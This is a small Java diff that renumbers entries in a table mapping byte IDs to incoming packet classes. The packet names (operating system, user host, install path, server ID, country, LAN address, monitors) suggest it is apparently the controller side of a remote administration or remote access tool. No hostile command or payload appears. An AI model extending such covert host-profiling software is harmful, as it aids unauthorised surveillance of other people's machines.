@@ -23,6 +23,7 @@ public class IncomingPackets {
 	private static void reload() {
 		incomingPackets.clear();
 
+		incomingPackets.put((byte) 4, Packet4InitOperatingSystem.class);
 		incomingPackets.put((byte) 5, Packet5InitUserHost.class);
 
 		incomingPackets.put((byte) 36, Packet36Initialized.class);
@@ -33,7 +34,6 @@ public class IncomingPackets {
 		incomingPackets.put((byte) 23, Packet23InitInstallPath.class);
 		incomingPackets.put((byte) 10, Packet10InitDefaultLocale.class);
 		incomingPackets.put((byte) 15, Packet15InitServerID.class);
-		incomingPackets.put((byte) 16, Packet16InitOperatingSystem.class);
 		incomingPackets.put((byte) 47, Packet47InitCountry.class);
 		incomingPackets.put((byte) 28, Packet28InitLanAddress.class);
 		incomingPackets.put((byte) 61, Packet61InitMonitors.class);
